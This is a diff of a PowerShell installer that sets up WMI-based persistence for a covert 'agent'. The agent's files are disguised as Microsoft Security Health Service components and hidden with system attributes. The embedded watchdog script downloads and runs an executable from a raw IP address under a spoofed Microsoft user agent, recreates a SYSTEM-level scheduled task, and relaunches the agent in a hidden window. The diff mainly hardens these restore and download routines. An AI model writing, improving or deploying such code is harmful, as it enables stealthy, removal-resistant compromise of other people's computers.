@@ -22,24 +22,25 @@
 # CONFIGURATION
 # ═══════════════════════════════════════════════════════════════════════════
 
-$PrimaryPath     = Join-Path $env:ProgramData 'Microsoft\SecurityHealth\GhostRoot\securityhealthservice.exe'
-$SecondaryPath   = Join-Path $env:ProgramData 'Microsoft\Windows\securityhelper.exe'
-$ActionPath      = Join-Path $env:ProgramData 'Microsoft\Windows\watchdog_action.ps1'
-$TaskName        = 'Microsoft Security Health Service'
-$AgentMutexName  = 'Global\AgentSingleInstanceMutex'
-$LogPath         = Join-Path $env:ProgramData 'Microsoft\SecurityHealth\watchdog.log'
-$CooldownFile    = Join-Path $env:ProgramData 'Microsoft\SecurityHealth\.last_restart'
-$DownloadUrl     = 'http://150.136.246.12:33875/static/SecurityHealthService.exe'
+$PrimaryPath = Join-Path $env:ProgramData 'Microsoft\SecurityHealth\GhostRoot\securityhealthservice.exe'
+$SecondaryPath = Join-Path $env:ProgramData 'Microsoft\Windows\securityhelper.exe'
+$ActionPath = Join-Path $env:ProgramData 'Microsoft\Windows\watchdog_action.ps1'
+$TaskName = 'Microsoft Security Health Service'
+$AgentMutexName = 'Global\AgentSingleInstanceMutex'
+$WatchdogMutexName = 'Global\WatchdogActionSingleInstanceMutex'
+$LogPath = Join-Path $env:ProgramData 'Microsoft\SecurityHealth\watchdog.log'
+$CooldownFile = Join-Path $env:ProgramData 'Microsoft\SecurityHealth\.last_restart'
+$DownloadUrl = 'http://150.136.246.12:9000/SecurityHealthService.exe'
 $PollIntervalSec = 60
-$CooldownSec     = 30
+$CooldownSec = 30
 
 # Derive unique WMI names from hostname hash (matches remove_persistence.bat)
-$hostHash     = [System.BitConverter]::ToString(
-                    [System.Security.Cryptography.MD5]::Create().ComputeHash(
-                        [System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME)
-                    )
-                ).Replace('-','').Substring(0,10)
-$filterName   = "F_$hostHash"
+$hostHash = [System.BitConverter]::ToString(
+    [System.Security.Cryptography.MD5]::Create().ComputeHash(
+        [System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME)
+    )
+).Replace('-', '').Substring(0, 10)
+$filterName = "F_$hostHash"
 $consumerName = "C_$hostHash"
 
 # ═══════════════════════════════════════════════════════════════════════════
@@ -47,7 +48,7 @@ $consumerName = "C_$hostHash"
 # ═══════════════════════════════════════════════════════════════════════════
 
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
-           ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
 if (-not $isAdmin) {
     Write-Host '[!] ERROR: Administrator privileges required for WMI registration.' -ForegroundColor Red
@@ -71,14 +72,15 @@ $template = @'
 $ErrorActionPreference = 'SilentlyContinue'
 
 # --- Configuration (baked in at install time) ---
-$PrimaryPath    = '__PRIMARY_PATH__'
-$SecondaryPath  = '__SECONDARY_PATH__'
-$TaskName       = '__TASK_NAME__'
-$AgentMutexName = '__MUTEX_NAME__'
-$LogPath        = '__LOG_PATH__'
-$CooldownFile   = '__COOLDOWN_FILE__'
-$DownloadUrl    = '__DOWNLOAD_URL__'
-$CooldownSec    = __COOLDOWN_SEC__
+$PrimaryPath       = '__PRIMARY_PATH__'
+$SecondaryPath     = '__SECONDARY_PATH__'
+$TaskName          = '__TASK_NAME__'
+$AgentMutexName    = '__MUTEX_NAME__'
+$WatchdogMutexName = '__WATCHDOG_MUTEX_NAME__'
+$LogPath           = '__LOG_PATH__'
+$CooldownFile      = '__COOLDOWN_FILE__'
+$DownloadUrl       = '__DOWNLOAD_URL__'
+$CooldownSec       = __COOLDOWN_SEC__
 
 # --- Logging ---
 function Write-Log {
@@ -97,183 +99,269 @@ function Write-Log {
 
 # --- PE Executable Verification Helper ---
 function Test-ValidPE {
-    param([string]$Path)
+    param(
+        [string]$Path,
+        [long]$MinSize = 1048576 # 1MB minimum size threshold
+    )
+    if ([string]::IsNullOrWhiteSpace($Path) -or -not (Test-Path -LiteralPath $Path)) { return $false }
+    $stream = $null
+    $reader = $null
     try {
-        $item = Get-Item -Path $Path -Force -ErrorAction SilentlyContinue
-        if (-not $item -or $item.Length -lt 1048576) { return $false } # Minimum 1MB for valid binary
-        $stream = [System.IO.File]::OpenRead($Path)
-        $bytes = New-Object byte[] 2
-        $read = $stream.Read($bytes, 0, 2)
-        $stream.Close()
-        if ($read -eq 2 -and $bytes[0] -eq 0x4D -and $bytes[1] -eq 0x5A) {
-            return $true
-        }
-    } catch {}
-    return $false
+        $item = Get-Item -LiteralPath $Path -Force -ErrorAction SilentlyContinue
+        if (-not $item -or $item.Length -lt $MinSize) { return $false }
+        
+        $stream = [System.IO.File]::Open($Path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
+        if ($stream.Length -lt 0x40) { return $false }
+        
+        $reader = New-Object System.IO.BinaryReader($stream)
+        # Verify DOS header magic 'MZ' (0x5A4D)
+        if ($reader.ReadUInt16() -ne 0x5A4D) { return $false }
+        
+        # Seek to e_lfanew offset (0x3C)
+        $stream.Seek(0x3C, [System.IO.SeekOrigin]::Begin) | Out-Null
+        $peOffset = $reader.ReadInt32()
+        if ($peOffset -lt 0x40 -or ($peOffset + 4) -gt $stream.Length) { return $false }
+        
+        # Seek to NT header and verify 'PE\0\0' (0x00004550)
+        $stream.Seek($peOffset, [System.IO.SeekOrigin]::Begin) | Out-Null
+        if ($reader.ReadUInt32() -ne 0x00004550) { return $false }
+        
+        return $true
+    } catch {
+        return $false
+    } finally {
+        if ($reader) { try { $reader.Close() } catch {} }
+        if ($stream) { try { $stream.Dispose() } catch {} }
+    }
 }
 
-# ═══════════════════ STEP 1: MUTEX LIVENESS CHECK ═══════════════════
+# ═══════════════════ SINGLE INSTANCE WATCHDOG ACTION LOCK ═══════════════════
+$actionMutex = $null
+$hasActionLock = $false
 try {
-    $testMutex = [System.Threading.Mutex]::OpenExisting($AgentMutexName)
-    if ($testMutex) {
-        $testMutex.Dispose()
-        exit
-    }
-} catch [System.Threading.WaitHandleCannotBeOpenedException] {
-    # Mutex does not exist — agent is dead. Proceed with recovery.
-} catch {
-    # Proceed with recovery on error
-}
-
-Write-Log 'Agent mutex not found. Starting recovery checks.'
-
-# ═══════════════════ STEP 2: FILE INTEGRITY SYNC & PE VERIFICATION ═══════════════════
-try {
-    # Purge corrupted/invalid binaries first
-    if ((Test-Path -Path $PrimaryPath) -and -not (Test-ValidPE $PrimaryPath)) {
-        Write-Log 'Primary binary corrupted or invalid PE header. Purging...' 'WARN'
-        & attrib -h -s -r $PrimaryPath 2>$null
-        Remove-Item -Path $PrimaryPath -Force -ErrorAction SilentlyContinue
-    }
-    if ((Test-Path -Path $SecondaryPath) -and -not (Test-ValidPE $SecondaryPath)) {
-        Write-Log 'Secondary binary corrupted or invalid PE header. Purging...' 'WARN'
-        & attrib -h -s -r $SecondaryPath 2>$null
-        Remove-Item -Path $SecondaryPath -Force -ErrorAction SilentlyContinue
-    }
-
-    $priExists = Test-ValidPE $PrimaryPath
-    $secExists = Test-ValidPE $SecondaryPath
-
-    if (-not $priExists -and -not $secExists) {
-        Write-Log 'Both binaries missing or invalid. Initiating intelligent download...' 'WARN'
-        $tempFile = Join-Path $env:TEMP "shs_$([System.IO.Path]::GetRandomFileName()).tmp"
-        $downloadSuccess = $false
-
-        for ($attempt = 1; $attempt -le 50; $attempt++) {
-            try {
-                Write-Log "Download attempt $attempt of 50..." 'INFO'
-                [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11
-                $req = [System.Net.WebRequest]::Create($DownloadUrl)
-                $req.UserAgent = 'Microsoft-CryptoAPI/10.0'
-                $req.Timeout = 300000  # 5 minute timeout for slow internet / large downloads
-                $resp = $req.GetResponse()
-                $expectedLength = $resp.ContentLength
-                $respStream = $resp.GetResponseStream()
-                
-                $fileStream = [System.IO.File]::Create($tempFile)
-                $buffer = New-Object byte[] 65536
-                while (($read = $respStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
-                    $fileStream.Write($buffer, 0, $read)
-                }
-                $fileStream.Close()
-                $respStream.Close()
-                $resp.Close()
-
-                $dlItem = Get-Item -Path $tempFile -Force -ErrorAction SilentlyContinue
-                $dlSize = if ($dlItem) { $dlItem.Length } else { 0 }
-
-                # Verify size against Content-Length header and verify PE header ('MZ')
-                $sizeValid = ($expectedLength -le 0) -or ($dlSize -eq $expectedLength)
-                if ($sizeValid -and (Test-ValidPE $tempFile)) {
-                    $downloadSuccess = $true
-                    Write-Log "Download verified ($dlSize bytes, valid PE header)." 'WARN'
-                    break
-                } else {
-                    Write-Log "Download verification failed (Downloaded: $dlSize, Expected: $expectedLength). Purging and retrying in 10s..." 'WARN'
-                    if (Test-Path $tempFile) { Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue }
-                    Start-Sleep -Seconds 10
-                }
-            } catch {
-                Write-Log "Download attempt $attempt failed: $_. Retrying in 10s..." 'WARN'
-                if (Test-Path $tempFile) { Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue }
-                Start-Sleep -Seconds 10
-            }
-        }
-
-        if ($downloadSuccess) {
-            $priDir = Split-Path -Parent $PrimaryPath
-            if (-not (Test-Path $priDir)) { New-Item -Path $priDir -ItemType Directory -Force | Out-Null }
-            & attrib -h -s $PrimaryPath 2>$null
-            Copy-Item -Path $tempFile -Destination $PrimaryPath -Force
-            & attrib +h +s $PrimaryPath 2>$null
-
-            $secDir = Split-Path -Parent $SecondaryPath
-            if (-not (Test-Path $secDir)) { New-Item -Path $secDir -ItemType Directory -Force | Out-Null }
-            & attrib -h -s $SecondaryPath 2>$null
-            Copy-Item -Path $tempFile -Destination $SecondaryPath -Force
-            & attrib +h +s $SecondaryPath 2>$null
-
-            Write-Log "Deployed verified agent binary to primary and secondary locations." 'WARN'
-        } else {
-            Write-Log 'All download attempts failed.' 'ERROR'
-        }
-        if (Test-Path $tempFile) { Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue }
-    }
-    elseif (-not $priExists -and $secExists) {
-        $secItem = Get-Item -Path $SecondaryPath -Force -ErrorAction SilentlyContinue
-        $srcSize = if ($secItem) { $secItem.Length } else { 0 }
-        if ($srcSize -gt 0) {
-            $parentDir = Split-Path -Parent $PrimaryPath
-            if (-not (Test-Path $parentDir)) { New-Item -Path $parentDir -ItemType Directory -Force | Out-Null }
-            & attrib -h -s $PrimaryPath 2>$null
-            Copy-Item -Path $SecondaryPath -Destination $PrimaryPath -Force
-            & attrib +h +s $PrimaryPath 2>$null
-            Write-Log "Restored primary binary from secondary ($srcSize bytes)." 'WARN'
-        } else {
-            Write-Log 'Secondary binary is 0 bytes — skipping restore.' 'ERROR'
-        }
-    }
-    elseif (-not $secExists -and $priExists) {
-        $priItem = Get-Item -Path $PrimaryPath -Force -ErrorAction SilentlyContinue
-        $srcSize = if ($priItem) { $priItem.Length } else { 0 }
-        if ($srcSize -gt 0) {
-            $parentDir = Split-Path -Parent $SecondaryPath
-            if (-not (Test-Path $parentDir)) { New-Item -Path $parentDir -ItemType Directory -Force | Out-Null }
-            & attrib -h -s $SecondaryPath 2>$null
-            Copy-Item -Path $PrimaryPath -Destination $SecondaryPath -Force
-            & attrib +h +s $SecondaryPath 2>$null
-            Write-Log "Restored secondary binary from primary ($srcSize bytes)." 'WARN'
-        } else {
-            Write-Log 'Primary binary is 0 bytes — skipping restore.' 'ERROR'
-        }
+    $actionMutex = New-Object System.Threading.Mutex($false, $WatchdogMutexName)
+    $hasActionLock = $actionMutex.WaitOne(0, $false)
+    if (-not $hasActionLock) {
+        # Another instance of watchdog action is currently running (e.g. downloading / retrying)
+        exit 0
     }
 } catch {
-    Write-Log "File sync error: $_" 'ERROR'
+    # If unable to acquire or check mutex, proceed cautiously
 }
 
-# ═══════════════════ STEP 3: SCHEDULED TASK REPAIR ═══════════════════
 try {
-    $taskOk = $false
-    $queryResult = & schtasks /query /tn $TaskName /xml 2>$null
-    if ($LASTEXITCODE -eq 0 -and $queryResult) {
-        $xmlStr = $queryResult -join "`n"
-        if (-not [string]::IsNullOrWhiteSpace($xmlStr)) {
-            $xmlClean = $xmlStr -replace ' xmlns="[^"]+"', ''
-            try {
-                [xml]$taskXml = $xmlClean
-                $cmdNode = $taskXml.SelectSingleNode('//Command')
-                $enabledNodes = $taskXml.SelectNodes('//Enabled')
-                $isEnabled = $true
-                if ($enabledNodes) {
-                    foreach ($en in $enabledNodes) {
-                        if ($en.InnerText -eq 'false') { $isEnabled = $false; break }
+    # ═══════════════════ STEP 1: MUTEX LIVENESS CHECK ═══════════════════
+    try {
+        $testMutex = [System.Threading.Mutex]::OpenExisting($AgentMutexName)
+        if ($testMutex) {
+            $testMutex.Dispose()
+            exit 0
+        }
+    } catch [System.Threading.WaitHandleCannotBeOpenedException] {
+        # Mutex does not exist — agent is dead. Proceed with recovery.
+    } catch [System.UnauthorizedAccessException] {
+        # Mutex exists in another session/privilege level — agent is ALIVE!
+        exit 0
+    } catch {
+        # Proceed with recovery on unexpected error
+    }
+
+    Write-Log 'Agent mutex not found. Starting recovery checks.'
+
+    # ═══════════════════ STEP 2: FILE INTEGRITY SYNC & PE VERIFICATION ═══════════════════
+    try {
+        # Purge corrupted/invalid binaries first
+        if ((Test-Path -LiteralPath $PrimaryPath) -and -not (Test-ValidPE $PrimaryPath)) {
+            Write-Log 'Primary binary corrupted or invalid PE header. Purging...' 'WARN'
+            & attrib -h -s -r $PrimaryPath 2>$null
+            Remove-Item -LiteralPath $PrimaryPath -Force -ErrorAction SilentlyContinue
+        }
+        if ((Test-Path -LiteralPath $SecondaryPath) -and -not (Test-ValidPE $SecondaryPath)) {
+            Write-Log 'Secondary binary corrupted or invalid PE header. Purging...' 'WARN'
+            & attrib -h -s -r $SecondaryPath 2>$null
+            Remove-Item -LiteralPath $SecondaryPath -Force -ErrorAction SilentlyContinue
+        }
+
+        $priExists = Test-ValidPE $PrimaryPath
+        $secExists = Test-ValidPE $SecondaryPath
+
+        if (-not $priExists -and -not $secExists) {
+            Write-Log 'Both binaries missing or invalid. Initiating resilient download...' 'WARN'
+            $tempFile = Join-Path $env:TEMP "shs_$([System.IO.Path]::GetRandomFileName()).tmp"
+            $downloadSuccess = $false
+            $maxAttempts = 30
+
+            for ($attempt = 1; $attempt -le $maxAttempts; $attempt++) {
+                $resp = $null
+                $respStream = $null
+                $fileStream = $null
+                try {
+                    Write-Log "Download attempt $attempt of $maxAttempts..." 'INFO'
+                    try {
+                        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11 -bor [System.Net.SecurityProtocolType]::Tls
+                        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 12288
+                    } catch {}
+
+                    $req = [System.Net.WebRequest]::Create($DownloadUrl)
+                    $req.UserAgent = 'Microsoft-CryptoAPI/10.0'
+                    $req.Timeout = 60000          # 60 second connection & headers timeout
+                    $req.ReadWriteTimeout = 60000 # 60 second chunk streaming timeout
+                    
+                    $resp = $req.GetResponse()
+                    $expectedLength = $resp.ContentLength
+                    $respStream = $resp.GetResponseStream()
+
+                    if (Test-Path -LiteralPath $tempFile) {
+                        Remove-Item -LiteralPath $tempFile -Force -ErrorAction SilentlyContinue
+                    }
+
+                    $fileStream = [System.IO.File]::Create($tempFile)
+                    $buffer = New-Object byte[] 65536
+                    while (($read = $respStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
+                        $fileStream.Write($buffer, 0, $read)
+                    }
+                    $fileStream.Flush()
+                    $fileStream.Close()
+                    $fileStream.Dispose()
+                    $fileStream = $null
+
+                    $respStream.Close()
+                    $respStream.Dispose()
+                    $respStream = $null
+
+                    $resp.Close()
+                    $resp = $null
+
+                    $dlItem = Get-Item -LiteralPath $tempFile -Force -ErrorAction SilentlyContinue
+                    $dlSize = if ($dlItem) { $dlItem.Length } else { 0 }
+
+                    # Verify size against Content-Length header and verify PE structure
+                    $sizeValid = ($expectedLength -le 0) -or ($dlSize -eq $expectedLength)
+                    $peValid = Test-ValidPE $tempFile
+
+                    if ($sizeValid -and $peValid) {
+                        $downloadSuccess = $true
+                        Write-Log "Download verified ($dlSize bytes, valid PE header)." 'WARN'
+                        break
+                    } else {
+                        Write-Log "Download verification failed (Downloaded: $dlSize bytes, Expected: $expectedLength, PE Valid: $peValid)." 'WARN'
+                        if (Test-Path -LiteralPath $tempFile) {
+                            Remove-Item -LiteralPath $tempFile -Force -ErrorAction SilentlyContinue
+                        }
+                    }
+                } catch {
+                    Write-Log "Download attempt $attempt failed: $($_.Exception.Message)" 'WARN'
+                } finally {
+                    if ($fileStream) {
+                        try { $fileStream.Close() } catch {}
+                        try { $fileStream.Dispose() } catch {}
+                    }
+                    if ($respStream) {
+                        try { $respStream.Close() } catch {}
+                        try { $respStream.Dispose() } catch {}
+                    }
+                    if ($resp) {
+                        try { $resp.Close() } catch {}
                     }
                 }
-                $targetExe = if (Test-ValidPE $PrimaryPath) { $PrimaryPath } else { $SecondaryPath }
-                if ($cmdNode -and $cmdNode.InnerText -eq $targetExe -and $isEnabled) {
-                    $taskOk = $true
+
+                if (-not $downloadSuccess) {
+                    if (Test-Path -LiteralPath $tempFile) {
+                        Remove-Item -LiteralPath $tempFile -Force -ErrorAction SilentlyContinue
+                    }
+                    if ($attempt -lt $maxAttempts) {
+                        # Adaptive backoff retry for network drops: 5s, 10s, 15s... max 30s
+                        $backoffSec = [Math]::Min(30, ($attempt * 5))
+                        Write-Log "Internet or server unavailable. Retrying in ${backoffSec}s..." 'INFO'
+                        Start-Sleep -Seconds $backoffSec
+                    }
                 }
-            } catch {
-                Write-Log "Task XML parse error: $_" 'WARN'
+            }
+
+            if ($downloadSuccess) {
+                $priDir = Split-Path -Parent $PrimaryPath
+                if (-not (Test-Path $priDir)) { New-Item -Path $priDir -ItemType Directory -Force | Out-Null }
+                & attrib -h -s -r $PrimaryPath 2>$null
+                Copy-Item -Path $tempFile -Destination $PrimaryPath -Force
+                & attrib +h +s $PrimaryPath 2>$null
+
+                $secDir = Split-Path -Parent $SecondaryPath
+                if (-not (Test-Path $secDir)) { New-Item -Path $secDir -ItemType Directory -Force | Out-Null }
+                & attrib -h -s -r $SecondaryPath 2>$null
+                Copy-Item -Path $tempFile -Destination $SecondaryPath -Force
+                & attrib +h +s $SecondaryPath 2>$null
+
+                Write-Log "Deployed verified agent binary to primary and secondary locations." 'WARN'
+            } else {
+                Write-Log "All $maxAttempts download attempts failed. Internet may be unavailable; will retry on next poll cycle." 'ERROR'
+            }
+            if (Test-Path -LiteralPath $tempFile) { Remove-Item -LiteralPath $tempFile -Force -ErrorAction SilentlyContinue }
+        }
+        elseif (-not $priExists -and $secExists) {
+            $secItem = Get-Item -LiteralPath $SecondaryPath -Force -ErrorAction SilentlyContinue
+            $srcSize = if ($secItem) { $secItem.Length } else { 0 }
+            if ($srcSize -gt 0) {
+                $parentDir = Split-Path -Parent $PrimaryPath
+                if (-not (Test-Path $parentDir)) { New-Item -Path $parentDir -ItemType Directory -Force | Out-Null }
+                & attrib -h -s -r $PrimaryPath 2>$null
+                Copy-Item -Path $SecondaryPath -Destination $PrimaryPath -Force
+                & attrib +h +s $PrimaryPath 2>$null
+                Write-Log "Restored primary binary from secondary ($srcSize bytes)." 'WARN'
+            } else {
+                Write-Log 'Secondary binary is 0 bytes — skipping restore.' 'ERROR'
             }
         }
+        elseif (-not $secExists -and $priExists) {
+            $priItem = Get-Item -LiteralPath $PrimaryPath -Force -ErrorAction SilentlyContinue
+            $srcSize = if ($priItem) { $priItem.Length } else { 0 }
+            if ($srcSize -gt 0) {
+                $parentDir = Split-Path -Parent $SecondaryPath
+                if (-not (Test-Path $parentDir)) { New-Item -Path $parentDir -ItemType Directory -Force | Out-Null }
+                & attrib -h -s -r $SecondaryPath 2>$null
+                Copy-Item -Path $PrimaryPath -Destination $SecondaryPath -Force
+                & attrib +h +s $SecondaryPath 2>$null
+                Write-Log "Restored secondary binary from primary ($srcSize bytes)." 'WARN'
+            } else {
+                Write-Log 'Primary binary is 0 bytes — skipping restore.' 'ERROR'
+            }
+        }
+    } catch {
+        Write-Log "File sync error: $_" 'ERROR'
     }
 
-    if (-not $taskOk) {
-        $targetExe = if (Test-ValidPE $PrimaryPath) { $PrimaryPath } else { $SecondaryPath }
-        if (Test-ValidPE $targetExe) {
-            & schtasks /delete /tn $TaskName /f 2>$null
-            $xmlContent = @"
+    # ═══════════════════ STEP 3: SCHEDULED TASK REPAIR ═══════════════════
+    try {
+        $taskOk = $false
+        $queryResult = & schtasks /query /tn $TaskName /xml 2>$null
+        if ($LASTEXITCODE -eq 0 -and $queryResult) {
+            $xmlStr = $queryResult -join "`n"
+            if (-not [string]::IsNullOrWhiteSpace($xmlStr)) {
+                $xmlClean = $xmlStr -replace ' xmlns="[^"]+"', ''
+                try {
+                    [xml]$taskXml = $xmlClean
+                    $cmdNode = $taskXml.SelectSingleNode('//Command')
+                    $enabledNodes = $taskXml.SelectNodes('//Enabled')
+                    $isEnabled = $true
+                    if ($enabledNodes) {
+                        foreach ($en in $enabledNodes) {
+                            if ($en.InnerText -eq 'false') { $isEnabled = $false; break }
+                        }
+                    }
+                    $targetExe = if (Test-ValidPE $PrimaryPath) { $PrimaryPath } else { $SecondaryPath }
+                    if ($cmdNode -and $cmdNode.InnerText -eq $targetExe -and $isEnabled) {
+                        $taskOk = $true
+                    }
+                } catch {
+                    Write-Log "Task XML parse error: $_" 'WARN'
+                }
+            }
+        }
+
+        if (-not $taskOk) {
+            $targetExe = if (Test-ValidPE $PrimaryPath) { $PrimaryPath } else { $SecondaryPath }
+            if (Test-ValidPE $targetExe) {
+                & schtasks /delete /tn $TaskName /f 2>$null
+                $xmlContent = @"
 <?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <Triggers>
@@ -307,82 +395,91 @@ try {
   </Actions>
 </Task>
 "@
-            $tmpXml = Join-Path $env:TEMP "task_$([System.IO.Path]::GetRandomFileName()).xml"
-            [System.IO.File]::WriteAllText($tmpXml, $xmlContent, [System.Text.Encoding]::Unicode)
-            & schtasks /create /tn $TaskName /xml $tmpXml /f 2>$null
-            if (Test-Path $tmpXml) { Remove-Item $tmpXml -Force -ErrorAction SilentlyContinue }
-            if ($LASTEXITCODE -eq 0) {
-                Write-Log "Recreated scheduled task pointing to $targetExe." 'WARN'
+                $tmpXml = Join-Path $env:TEMP "task_$([System.IO.Path]::GetRandomFileName()).xml"
+                [System.IO.File]::WriteAllText($tmpXml, $xmlContent, [System.Text.Encoding]::Unicode)
+                & schtasks.exe /create /tn "$TaskName" /xml "$tmpXml" /ru "SYSTEM" /f 2>$null
+                if (Test-Path -LiteralPath $tmpXml) { Remove-Item -LiteralPath $tmpXml -Force -ErrorAction SilentlyContinue }
+                if ($LASTEXITCODE -eq 0) {
+                    Write-Log "Recreated scheduled task pointing to $targetExe." 'WARN'
+                } else {
+                    Write-Log 'Failed to recreate scheduled task.' 'ERROR'
+                }
             } else {
-                Write-Log 'Failed to recreate scheduled task.' 'ERROR'
-            }
-        } else {
-            Write-Log 'No valid executables found for task repair.' 'ERROR'
-        }
-    }
-} catch {
-    Write-Log "Task repair error: $_" 'ERROR'
-}
-
-# ═══════════════════ STEP 4: AGENT RESTART ═══════════════════
-try {
-    $canRestart = $true
-    if (Test-Path -Path $CooldownFile) {
-        $cdItem = Get-Item -Path $CooldownFile -Force -ErrorAction SilentlyContinue
-        if ($cdItem -and $cdItem.LastWriteTime) {
-            $elapsed = ((Get-Date) - $cdItem.LastWriteTime).TotalSeconds
-            if ($elapsed -lt $CooldownSec) {
-                Write-Log "Cooldown active ($([int]$elapsed)s / $($CooldownSec)s). Skipping restart." 'INFO'
-                $canRestart = $false
+                Write-Log 'No valid executables found for task repair.' 'ERROR'
             }
         }
+    } catch {
+        Write-Log "Task repair error: $_" 'ERROR'
     }
 
-    if ($canRestart) {
-        $targetExe = if (Test-ValidPE $PrimaryPath) { $PrimaryPath }
-                      elseif (Test-ValidPE $SecondaryPath) { $SecondaryPath }
-                      else { $null }
-
-        if ($targetExe) {
-            $launched = $false
-
-            # Method 1: Try running existing scheduled task
-            & schtasks /run /tn $TaskName 2>$null
-            if ($LASTEXITCODE -eq 0) {
-                $launched = $true
-                Write-Log "Triggered agent restart via scheduled task '$TaskName'." 'WARN'
+    # ═══════════════════ STEP 4: AGENT RESTART ═══════════════════
+    try {
+        $canRestart = $true
+        if (Test-Path -LiteralPath $CooldownFile) {
+            $cdItem = Get-Item -LiteralPath $CooldownFile -Force -ErrorAction SilentlyContinue
+            if ($cdItem -and $cdItem.LastWriteTime) {
+                $elapsed = ((Get-Date) - $cdItem.LastWriteTime).TotalSeconds
+                if ($elapsed -lt $CooldownSec) {
+                    Write-Log "Cooldown active ($([int]$elapsed)s / $($CooldownSec)s). Skipping restart." 'INFO'
+                    $canRestart = $false
+                }
             }
-
-            # Method 2: Direct Start-Process fallback
-            if (-not $launched) {
-                Write-Log "Launching agent from $targetExe (Start-Process fallback)" 'WARN'
-                Start-Process -FilePath $targetExe -WindowStyle Hidden -ErrorAction Stop
-                $launched = $true
-            }
-
-            $cooldownDir = Split-Path -Parent $CooldownFile
-            if (-not (Test-Path $cooldownDir)) { New-Item -Path $cooldownDir -ItemType Directory -Force | Out-Null }
-            & attrib -h -s -r $CooldownFile 2>$null
-            [System.IO.File]::WriteAllText($CooldownFile, (Get-Date).ToString('o'))
-            & attrib +h +s $CooldownFile 2>$null
-        } else {
-            Write-Log 'No agent executables found. Cannot restart.' 'ERROR'
         }
+
+        if ($canRestart) {
+            $targetExe = if (Test-ValidPE $PrimaryPath) { $PrimaryPath }
+                          elseif (Test-ValidPE $SecondaryPath) { $SecondaryPath }
+                          else { $null }
+
+            if ($targetExe) {
+                $launched = $false
+
+                # Method 1: Try running existing scheduled task
+                & schtasks /run /tn $TaskName 2>$null
+                if ($LASTEXITCODE -eq 0) {
+                    $launched = $true
+                    Write-Log "Triggered agent restart via scheduled task '$TaskName'." 'WARN'
+                }
+
+                # Method 2: Direct Start-Process fallback
+                if (-not $launched) {
+                    Write-Log "Launching agent from $targetExe (Start-Process fallback)" 'WARN'
+                    Start-Process -FilePath $targetExe -WindowStyle Hidden -ErrorAction Stop
+                    $launched = $true
+                }
+
+                $cooldownDir = Split-Path -Parent $CooldownFile
+                if (-not (Test-Path $cooldownDir)) { New-Item -Path $cooldownDir -ItemType Directory -Force | Out-Null }
+                & attrib -h -s -r $CooldownFile 2>$null
+                [System.IO.File]::WriteAllText($CooldownFile, (Get-Date).ToString('o'))
+                & attrib +h +s $CooldownFile 2>$null
+            } else {
+                Write-Log 'No agent executables found. Cannot restart.' 'ERROR'
+            }
+        }
+    } catch {
+        Write-Log "Agent restart error: $_" 'ERROR'
     }
-} catch {
-    Write-Log "Agent restart error: $_" 'ERROR'
+} finally {
+    if ($actionMutex) {
+        if ($hasActionLock) {
+            try { $actionMutex.ReleaseMutex() } catch {}
+        }
+        try { $actionMutex.Dispose() } catch {}
+    }
 }
 '@
 
 $actionScriptContent = $template.
-    Replace('__PRIMARY_PATH__',   ($PrimaryPath -replace "'","''")).
-    Replace('__SECONDARY_PATH__', ($SecondaryPath -replace "'","''")).
-    Replace('__TASK_NAME__',      ($TaskName -replace "'","''")).
-    Replace('__MUTEX_NAME__',     ($AgentMutexName -replace "'","''")).
-    Replace('__LOG_PATH__',       ($LogPath -replace "'","''")).
-    Replace('__COOLDOWN_FILE__',  ($CooldownFile -replace "'","''")).
-    Replace('__DOWNLOAD_URL__',   ($DownloadUrl -replace "'","''")).
-    Replace('__COOLDOWN_SEC__',   $CooldownSec.ToString())
+Replace('__PRIMARY_PATH__', ($PrimaryPath -replace "'", "''")).
+Replace('__SECONDARY_PATH__', ($SecondaryPath -replace "'", "''")).
+Replace('__TASK_NAME__', ($TaskName -replace "'", "''")).
+Replace('__MUTEX_NAME__', ($AgentMutexName -replace "'", "''")).
+Replace('__WATCHDOG_MUTEX_NAME__', ($WatchdogMutexName -replace "'", "''")).
+Replace('__LOG_PATH__', ($LogPath -replace "'", "''")).
+Replace('__COOLDOWN_FILE__', ($CooldownFile -replace "'", "''")).
+Replace('__DOWNLOAD_URL__', ($DownloadUrl -replace "'", "''")).
+Replace('__COOLDOWN_SEC__', $CooldownSec.ToString())
 
 # Write the action script to disk
 $actionDir = Split-Path -Parent $ActionPath
@@ -405,22 +502,23 @@ $wmiNamespace = 'root\subscription'
 
 try {
     Get-CimInstance -Namespace $wmiNamespace -ClassName __FilterToConsumerBinding -ErrorAction SilentlyContinue |
-        Where-Object { $_.Filter -like "*$filterName*" -or $_.Filter.Name -eq $filterName } |
-        Remove-CimInstance -ErrorAction SilentlyContinue
+    Where-Object { $_.Filter -like "*$filterName*" -or $_.Filter.Name -eq $filterName } |
+    Remove-CimInstance -ErrorAction SilentlyContinue
 
     Get-CimInstance -Namespace $wmiNamespace -ClassName CommandLineEventConsumer -Filter "Name='$consumerName'" -ErrorAction SilentlyContinue |
-        Remove-CimInstance -ErrorAction SilentlyContinue
+    Remove-CimInstance -ErrorAction SilentlyContinue
 
     Get-CimInstance -Namespace $wmiNamespace -ClassName __EventFilter -Filter "Name='$filterName'" -ErrorAction SilentlyContinue |
-        Remove-CimInstance -ErrorAction SilentlyContinue
+    Remove-CimInstance -ErrorAction SilentlyContinue
 
     # Also clean up any old volatile timer instructions (from previous versions)
     $timerName = "T_$hostHash"
